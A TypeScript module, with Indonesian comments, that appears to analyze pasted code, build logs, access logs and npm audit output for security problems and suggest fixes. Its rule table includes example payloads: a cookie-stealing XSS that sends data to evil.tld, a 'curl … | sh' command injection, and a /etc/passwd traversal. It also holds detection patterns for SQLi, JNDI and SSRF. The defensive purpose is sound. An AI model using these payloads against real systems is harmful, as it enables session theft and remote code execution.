import { nanoid } from "nanoid";
import type { Severity } from "@/lib/types";
import type {
  InputKind,
  LeakLocation,
  SecurityFinding,
  SecurityReport,
  TimelineEvent,
  VulnerabilityType,
} from "./types";

const SEVERITY_RANK: Record<Severity, number> = {
  CRITICAL: 4,
  HIGH: 3,
  MEDIUM: 2,
  LOW: 1,
  INFO: 0,
};

function highestSeverity(list: Severity[]): Severity {
  if (list.length === 0) return "INFO";
  return list.reduce((a, b) => (SEVERITY_RANK[b] > SEVERITY_RANK[a] ? b : a));
}

function makeFinding(partial: Omit<SecurityFinding, "id">): SecurityFinding {
  return { id: nanoid(8), ...partial };
}

// ---------------------------------------------------------------------------
// 1. Deteksi jenis input
// ---------------------------------------------------------------------------
export function detectInputKind(input: string, filename?: string): InputKind {
  const trimmed = input.trim();
  const lowerName = (filename ?? "").toLowerCase();

  if (lowerName.endsWith(".har")) return "har";

  if (trimmed.startsWith("{") || trimmed.startsWith("[")) {
    try {
      const parsed = JSON.parse(trimmed);
      if (parsed && (parsed.vulnerabilities || parsed.auditReportVersion)) {
        return "npm-audit-json";
      }
      if (parsed && parsed.log && parsed.log.entries) return "har";
    } catch {
      // bukan JSON valid, lanjut ke heuristik lain
    }
  }

  if (/^\s*(GET|POST|PUT|DELETE|PATCH)\s+.+HTTP\/\d/m.test(trimmed) ||
    /\d{1,3}(\.\d{1,3}){3}.+\[.+\].+"(GET|POST|PUT|DELETE)/.test(trimmed)) {
    return /cf-ray|cloudflare/i.test(trimmed) ? "cloudflare-log" : "access-log";
  }

  if (/\bnpm audit\b|"auditReportVersion"/i.test(trimmed)) return "npm-audit-json";

  if (/Compiled with warnings|Unexpected any|▲ Next\.js|Failed to compile|route\.ts|page\.tsx/i.test(trimmed)) {
    return "next-build-log";
  }

  if (/at\s+\S+\s+\(.+:\d+:\d+\)/.test(trimmed) || /Traceback \(most recent call last\)/.test(trimmed)) {
    return "stack-trace";
  }

  if (
    /\bfunction\b|\bconst\b|\blet\b|<\?php|\bdef\b|\bimport\b|\bclass\b/.test(trimmed) &&
    trimmed.length > 20
  ) {
    return "source-code";
  }

  return "unknown";
}

// ---------------------------------------------------------------------------
// 2. Static code analyzer — pola berbahaya umum di JS/TS/PHP/Python
// ---------------------------------------------------------------------------
interface CodeRule {
  pattern: RegExp;
  severity: Severity;
  vulnerabilityType: VulnerabilityType;
  owasp: string;
  title: (match: string) => string;
  attackVector: string;
  payload?: string;
  fixHint: { step: string; codeAfter: string };
}

const CODE_RULES: CodeRule[] = [
  {
    pattern: /:\s*any\b/g,
    severity: "MEDIUM",
    vulnerabilityType: "Info Disclosure",
    owasp: "A04:2021 - Insecure Design",
    title: () => "Penggunaan tipe 'any' menghilangkan validasi tipe pada data sensitif",
    attackVector:
      "Tipe 'any' menonaktifkan type-checking TypeScript, sehingga data dari luar (request body, query, session) bisa mengalir tanpa validasi ke logic sensitif — termasuk field yang seharusnya tidak pernah diekspos ke client (password hash, token internal, dsb).",
    fixHint: {
      step: "Ganti `any` dengan `unknown` lalu validasi bentuknya memakai skema (mis. zod) sebelum dipakai.",
      codeAfter: "const body: unknown = await req.json();\nconst data = mySchema.parse(body); // zod",
    },
  },
  {
    pattern: /eval\s*\(/g,
    severity: "CRITICAL",
    vulnerabilityType: "RCE",
    owasp: "A03:2021 - Injection",
    title: () => "Penggunaan eval() terhadap input yang berpotensi tidak tepercaya",
    attackVector:
      "eval() mengeksekusi string sebagai kode JavaScript. Jika string tersebut berasal (langsung/tidak langsung) dari input user, attacker bisa menyisipkan kode arbitrer yang dijalankan di server/browser korban (Remote Code Execution).",
    payload: "'; require(\"child_process\").exec(\"id\"); //",
    fixHint: {
      step: "Hilangkan eval() sepenuhnya. Gunakan JSON.parse untuk data, atau fungsi murni tanpa eksekusi string dinamis.",
      codeAfter: "const data = JSON.parse(input); // bukan eval(input)",
    },
  },
  {
    pattern: /dangerouslySetInnerHTML/g,
    severity: "HIGH",
    vulnerabilityType: "XSS",
    owasp: "A03:2021 - Injection",
    title: () => "dangerouslySetInnerHTML merender HTML mentah tanpa sanitasi",
    attackVector:
      "Jika konten yang dirender berasal dari input user (komentar, bio, nama file, dsb) tanpa sanitasi, attacker bisa menyisipkan <script> atau event handler untuk mencuri cookie/session (stored/reflected XSS).",
    payload: "<img src=x onerror=fetch('https://evil.tld/steal?c='+document.cookie)>",
    fixHint: {
      step: "Sanitasi HTML dengan library seperti DOMPurify sebelum di-render, atau hindari HTML mentah sama sekali.",
      codeAfter:
        "import DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />",
    },
  },
  {
    pattern: /(?<!textContent\s*=\s*)\.innerHTML\s*=/g,
    severity: "HIGH",
    vulnerabilityType: "XSS",
    owasp: "A03:2021 - Injection",
    title: () => "Penulisan langsung ke .innerHTML dengan data yang tidak disanitasi",
    attackVector:
      "Menulis string ke .innerHTML akan diparse sebagai HTML oleh browser. Data dari URL, respons API, atau input user yang masuk ke sini bisa memicu DOM-based XSS.",
    payload: "#<img src=x onerror=alert(document.domain)>",
    fixHint: {
      step: "Gunakan .textContent untuk teks biasa, atau sanitasi dengan DOMPurify jika memang butuh HTML.",
      codeAfter: "el.textContent = userInput; // bukan el.innerHTML = userInput",
    },
  },
  {
    pattern: /Math\.random\(\)/g,
    severity: "MEDIUM",
    vulnerabilityType: "DoS / Unpredictable Behavior",
    owasp: "A02:2021 - Cryptographic Failures",
    title: () => "Math.random() dipakai untuk nilai yang butuh keacakan aman (token/ID sensitif)",
    attackVector:
      "Math.random() tidak cryptographically secure dan bisa diprediksi. Jika dipakai untuk membuat token reset password, session ID, atau nilai lain yang jadi dasar keamanan, attacker berpotensi menebak/reproduksi nilainya. Jika dipakai di render path React, juga menyebabkan hydration mismatch / perilaku tak konsisten antar render (DoS ringan pada UX).",
    fixHint: {
      step: "Gunakan crypto.randomUUID() atau crypto.getRandomValues() untuk nilai yang berkaitan dengan keamanan.",
      codeAfter: "import { randomUUID } from 'crypto';\nconst token = randomUUID();",
    },
  },
  {
    pattern: /fs\.(readFile|readFileSync|writeFile|writeFileSync)\s*\(\s*[^)"'`]*(req|params|query|input|userInput)/gi,
    severity: "CRITICAL",
    vulnerabilityType: "Path Traversal",
    owasp: "A01:2021 - Broken Access Control",
    title: () => "Akses filesystem memakai path yang berasal langsung dari input user",
    attackVector:
      "Jika path file dibentuk dari parameter yang dikontrol user tanpa validasi/normalisasi, attacker bisa menyisipkan '../../' untuk membaca atau menimpa file di luar direktori yang dimaksud (Path/Directory Traversal), berpotensi membocorkan file konfigurasi, .env, atau kredensial.",
    payload: "?file=../../../../etc/passwd",
    fixHint: {
      step: "Validasi nama file dengan whitelist/regex ketat dan resolve path lalu pastikan tetap di dalam base directory.",
      codeAfter:
        "const safe = path.normalize(name).replace(/^(\\.\\.[\\/\\\\])+/, '');\nconst full = path.join(BASE_DIR, safe);\nif (!full.startsWith(BASE_DIR)) throw new Error('invalid path');",
    },
  },
  {
    pattern: /setState\s*\([^)]*\)\s*;?\s*(\/\/.*)?\n?\s*}\s*,\s*\[\]\)/g,
    severity: "LOW",
    vulnerabilityType: "DoS / Unpredictable Behavior",
    owasp: "A04:2021 - Insecure Design",
    title: () => "Pola setState di dalam useEffect berpotensi memicu render loop",
    attackVector:
      "Pemanggilan state-setter tanpa guard yang tepat di dalam efek bisa memicu render loop, yang di sisi client menyebabkan tab freeze/high CPU — sebuah bentuk client-side DoS yang bisa dipicu attacker lewat state yang dikontrolnya.",
    fixHint: {
      step: "Tambahkan dependency array yang tepat dan/atau guard kondisi sebelum memanggil setState.",
      codeAfter: "useEffect(() => {\n  if (needsUpdate) setState(next);\n}, [needsUpdate, next]);",
    },
  },
  {
    pattern: /exec\s*\(\s*[^)]*\b(req|params|query|input|userInput)\b/gi,
    severity: "CRITICAL",
    vulnerabilityType: "RCE",
    owasp: "A03:2021 - Injection",
    title: () => "Command shell dijalankan dengan argumen dari input user",
    attackVector:
      "Memasukkan input user langsung ke child_process.exec / os.system tanpa escaping memungkinkan attacker menyisipkan shell metacharacter (`;`, `|`, `&&`) untuk menjalankan perintah arbitrer di server (RCE).",
    payload: "somefile.txt; curl https://evil.tld/shell.sh | sh",
    fixHint: {
      step: "Gunakan execFile/spawn dengan argumen sebagai array (bukan string gabungan), atau whitelist ketat.",
      codeAfter: "execFile('convert', [safeArg1, safeArg2]); // bukan exec(`convert ${input}`)",
    },
  },
];

function lineColOf(source: string, index: number): { line: number; column: number } {
  const upTo = source.slice(0, index);
  const lines = upTo.split("\n");
  return { line: lines.length, column: lines[lines.length - 1].length + 1 };
}

function analyzeSourceCode(input: string, filename?: string): SecurityFinding[] {
  const findings: SecurityFinding[] = [];

  for (const rule of CODE_RULES) {
    const re = new RegExp(rule.pattern.source, rule.pattern.flags.includes("g") ? rule.pattern.flags : rule.pattern.flags + "g");
    let match: RegExpExecArray | null;
    let count = 0;
    while ((match = re.exec(input)) && count < 5) {
      count++;
      const { line, column } = lineColOf(input, match.index);
      const snippetStart = Math.max(0, match.index - 60);
      const snippetEnd = Math.min(input.length, match.index + match[0].length + 60);
      const snippet = input.slice(snippetStart, snippetEnd).trim();

      const leakLocation: LeakLocation = {
        file: filename,
        line,
        column,
      };

      findings.push(
        makeFinding({
          severity: rule.severity,
          title: rule.title(match[0]),
          leakLocation,
          vulnerabilityType: rule.vulnerabilityType,
          owaspCategory: rule.owasp,
          attackVector: rule.attackVector,
          payloadExample: rule.payload,
          codeSnippet: snippet,
          remediationSteps: [
            { step: rule.fixHint.step, codeBefore: match[0], codeAfter: rule.fixHint.codeAfter },
            { step: "Tambahkan test/lint rule agar pola ini tertangkap otomatis di CI sebelum merge." },
            { step: "Review ulang endpoint/komponen terkait untuk memastikan tidak ada instance lain dari pola yang sama." },
          ],
          prevention:
            "Tambahkan aturan ESLint/Semgrep khusus untuk pola ini, dan review kode berbasis checklist OWASP pada setiap PR yang menyentuh input eksternal.",
        })
      );
    }
  }

  return findings;
}

// ---------------------------------------------------------------------------
// 3. Next.js build log analyzer
// ---------------------------------------------------------------------------
function analyzeNextBuildLog(input: string): SecurityFinding[] {
  const findings: SecurityFinding[] = [];
  const lines = input.split("\n");

  lines.forEach((line, idx) => {
    const locMatch = line.match(/([./\w-]+\.(?:tsx?|jsx?)):(\d+):(\d+)/);
    const leakLocation: LeakLocation = locMatch
      ? { file: locMatch[1], line: Number(locMatch[2]), column: Number(locMatch[3]) }
      : {};

    if (/Unexpected any/i.test(line)) {
      findings.push(
        makeFinding({
          severity: "MEDIUM",
          title: `Warning 'Unexpected any' di build log — potensi data mengalir tanpa validasi tipe`,
          leakLocation,
          vulnerabilityType: "Info Disclosure",
          owaspCategory: "A04:2021 - Insecure Design",
          attackVector:
            "Sama seperti pola 'any' pada static analysis: tipe longgar membuka celah data tidak tervalidasi mengalir ke logic sensitif (auth, session, akses data).",
          codeSnippet: line.trim(),
          remediationSteps: [
            { step: "Ganti `any` dengan tipe eksplisit atau `unknown` + validasi zod." },
            { step: "Jalankan `eslint --max-warnings=0` di CI supaya warning ini gagal build." },
          ],
          prevention: "Aktifkan `noImplicitAny` di tsconfig dan larang `any` eksplisit lewat ESLint.",
        })
      );
    }

    if (/Math\.random.*render|render.*Math\.random/i.test(line)) {
      findings.push(
        makeFinding({
          severity: "LOW",
          title: "Math.random() dipanggil di render path — hasil tidak deterministik",
          leakLocation,
          vulnerabilityType: "DoS / Unpredictable Behavior",
          owaspCategory: "A04:2021 - Insecure Design",
          attackVector:
            "Nilai acak di render menyebabkan hydration mismatch antara server dan client, yang bisa dieksploitasi untuk memicu error berulang / high CPU pada client tertentu (client-side DoS ringan) dan membingungkan state aplikasi.",
          codeSnippet: line.trim(),
          remediationSteps: [
            { step: "Pindahkan Math.random() ke useEffect (hanya jalan di client setelah mount)." },
            { step: "Atau gunakan seed deterministik / id dari server untuk key yang butuh unik." },
          ],
          prevention: "Hindari side-effect/non-determinism di dalam badan komponen React.",
        })
      );
    }

    if (/setState.*render|Cannot update.*component while rendering/i.test(line)) {
      findings.push(
        makeFinding({
          severity: "LOW",
          title: "State di-update selama render — berisiko infinite render loop",
          leakLocation,
          vulnerabilityType: "DoS / Unpredictable Behavior",
          owaspCategory: "A04:2021 - Insecure Design",
          attackVector:
            "Update state langsung di badan komponen (bukan di event handler/effect) bisa memicu render loop tak terkendali, menyebabkan tab browser freeze — dapat dipicu attacker melalui data yang mengontrol kondisi tersebut.",
          codeSnippet: line.trim(),
          remediationSteps: [
            { step: "Pindahkan pemanggilan setState ke dalam useEffect dengan dependency array yang tepat." },
          ],
          prevention: "Review pola state management pada code review, tambahkan React strict mode di development.",
        })
      );
    }

    if (/Failed to compile|Module not found/i.test(line) && idx < lines.length) {
      // Informational only — bukan langsung kerentanan, tapi tetap dicatat sebagai INFO.
    }
  });

  return findings;
}

// ---------------------------------------------------------------------------
// 4. Access / Cloudflare log analyzer — deteksi payload serangan di traffic
// ---------------------------------------------------------------------------
const ATTACK_PATTERNS: { re: RegExp; type: VulnerabilityType; owasp: string; label: string }[] = [
  { re: /\.\.\//g, type: "Path Traversal", owasp: "A01:2021 - Broken Access Control", label: "Directory traversal (../)" },
  { re: /%2e%2e%2f|%252e%252e%252f/gi, type: "Path Traversal", owasp: "A01:2021 - Broken Access Control", label: "Encoded directory traversal" },
  { re: /<script[\s>]/gi, type: "XSS", owasp: "A03:2021 - Injection", label: "Inline <script> tag di parameter" },
  { re: /union\s+select/gi, type: "SQLi", owasp: "A03:2021 - Injection", label: "UNION SELECT (SQL Injection)" },
  { re: /or\s+1=1/gi, type: "SQLi", owasp: "A03:2021 - Injection", label: "Boolean-based SQLi (OR 1=1)" },
  { re: /;\s*(drop|delete)\s+table/gi, type: "SQLi", owasp: "A03:2021 - Injection", label: "Destructive SQL statement" },
  { re: /\$\{jndi:/gi, type: "RCE", owasp: "A03:2021 - Injection", label: "JNDI injection payload (Log4Shell-style)" },
  { re: /(?:https?:\/\/)(?:169\.254\.169\.254|localhost|127\.0\.0\.1)/gi, type: "SSRF", owasp: "A10:2021 - SSRF", label: "SSRF target ke metadata/localhost" },
  { re: /%5c|\\\\/g, type: "Path Traversal", owasp: "A01:2021 - Broken Access Control", label: "Backslash path traversal" },
  { re: /\/etc\/passwd|\/proc\/self\/environ/gi, type: "Path Traversal", owasp: "A01:2021 - Broken Access Control", label: "Percobaan baca file sensitif" },
];

function analyzeAccessLog(input: string): SecurityFinding[] {
  const findings: SecurityFinding[] = [];
  const lines = input.split("\n").filter(Boolean);

  lines.forEach((line, idx) => {
    for (const p of ATTACK_PATTERNS) {
      p.re.lastIndex = 0;
      if (p.re.test(line)) {
        const ipMatch = line.match(/^(\S+)/);
        const endpointMatch = line.match(/"(?:GET|POST|PUT|DELETE|PATCH)\s+([^\s"]+)/i);
        findings.push(
          makeFinding({
            severity: p.type === "SQLi" || p.type === "RCE" || p.type === "SSRF" ? "CRITICAL" : "HIGH",
            title: `${p.label} terdeteksi dari ${ipMatch?.[1] ?? "IP tidak diketahui"} pada baris log #${idx + 1}`,
            leakLocation: { endpoint: endpointMatch?.[1], line: idx + 1 },
            vulnerabilityType: p.type,
            owaspCategory: p.owasp,
            attackVector: `Request pada log ini mengandung pola ${p.label.toLowerCase()}. Ini adalah indikasi percobaan aktif dari sisi attacker, bukan sekadar celah statis.`,
            payloadExample: line.length > 200 ? line.slice(0, 200) + "…" : line,
            remediationSteps: [
              { step: "Blokir IP sumber sementara di WAF/Cloudflare firewall rule jika berulang." },
              { step: "Pastikan endpoint terkait melakukan validasi & parameterized query / output encoding." },
              { step: "Tambahkan rule WAF khusus untuk pola payload ini." },
            ],
            prevention: "Aktifkan managed WAF rules (mis. Cloudflare Managed Ruleset / OWASP CRS) dan rate limiting per-IP.",
          })
        );
      }
    }
  });

  return findings;
}

// ---------------------------------------------------------------------------
// 5. npm audit JSON analyzer
// ---------------------------------------------------------------------------
function analyzeNpmAudit(input: string): SecurityFinding[] {
  const findings: SecurityFinding[] = [];
  let parsed: unknown;
  try {
    parsed = JSON.parse(input);
  } catch {
    return findings;
  }
  if (!parsed || typeof parsed !== "object") return findings;

  const vulns = (parsed as { vulnerabilities?: Record<string, unknown> }).vulnerabilities;
  if (!vulns) return findings;

  for (const [pkgName, raw] of Object.entries(vulns)) {
    const v = raw as {
      severity?: string;
      via?: unknown[];
      range?: string;
      fixAvailable?: unknown;
    };
    const sevMap: Record<string, Severity> = {
      critical: "CRITICAL",
      high: "HIGH",
      moderate: "MEDIUM",
      low: "LOW",
      info: "INFO",
    };
    const severity = sevMap[(v.severity ?? "info").toLowerCase()] ?? "INFO";
    const viaTitles = Array.isArray(v.via)
      ? v.via.filter((x) => typeof x === "object" && x !== null).map((x) => (x as { title?: string }).title).filter(Boolean)
      : [];

    findings.push(
      makeFinding({
        severity,
        title: `Dependency rentan: ${pkgName}${v.range ? ` (${v.range})` : ""}${viaTitles[0] ? ` — ${viaTitles[0]}` : ""}`,
        leakLocation: { file: `package.json / node_modules/${pkgName}` },
        vulnerabilityType: "Dependency Vulnerability",
        owaspCategory: "A06:2021 - Vulnerable and Outdated Components",
        attackVector:
          "Library ini memiliki CVE publik. Jika fungsi yang rentan dipanggil dengan input yang bisa dikontrol attacker (langsung/tidak langsung), dampaknya mengikuti jenis CVE terkait (bisa RCE, DoS, prototype pollution, dsb).",
        remediationSteps: [
          {
            step: v.fixAvailable
              ? `Jalankan \`npm audit fix\` atau update ${pkgName} ke versi yang sudah dipatch.`
              : `Belum ada fix resmi untuk ${pkgName} — evaluasi mitigasi sementara (isolasi fitur terkait / cari alternatif package) sambil memantau advisory.`,
          },
          { step: "Jalankan `npm audit` di CI dan gagalkan build untuk severity high/critical." },
        ],
        prevention: "Pasang Dependabot/Renovate untuk update dependency otomatis dan audit rutin.",
      })
    );
  }

  return findings;
}

// ---------------------------------------------------------------------------
// 6. Orkestrator utama
// ---------------------------------------------------------------------------
export function analyzeSecurityLog(input: string, filename?: string): SecurityReport {
  const inputKind = detectInputKind(input, filename);
  let findings: SecurityFinding[] = [];

  switch (inputKind) {
    case "npm-audit-json":
      findings = analyzeNpmAudit(input);
      break;
    case "next-build-log":
      findings = analyzeNextBuildLog(input);
      break;
    case "access-log":
    case "cloudflare-log":
    case "har":
      findings = analyzeAccessLog(input);
      break;
    case "source-code":
    case "stack-trace":
    case "unknown":
    default:
      findings = analyzeSourceCode(input, filename);
      break;
  }

  // Fallback: kalau parser spesifik tidak menemukan apa-apa, tetap coba static
  // code analyzer sebagai jaring pengaman (mis. log yang menempel snippet kode).
  if (findings.length === 0 && inputKind !== "source-code") {
    findings = analyzeSourceCode(input, filename);
  }

  const overallSeverity = highestSeverity(findings.map((f) => f.severity));
  const top = findings.slice().sort((a, b) => SEVERITY_RANK[b.severity] - SEVERITY_RANK[a.severity])[0];

  const summary =
    findings.length === 0
      ? "Tidak ditemukan indikasi kebocoran atau pola berbahaya pada input yang dianalisis."
      : `${findings.length} temuan terdeteksi — paling kritis: ${top.title}`;

  const now = Date.now();
  const timeline: TimelineEvent[] = [{ label: "Detected", timestamp: now }];

  return {
    id: nanoid(10),
    createdAt: now,
    sourceName: filename || "pasted-input",
    inputKind,
    overallSeverity,
    summary,
    findings,
    timeline,
    aiEnriched: false,
  };
}
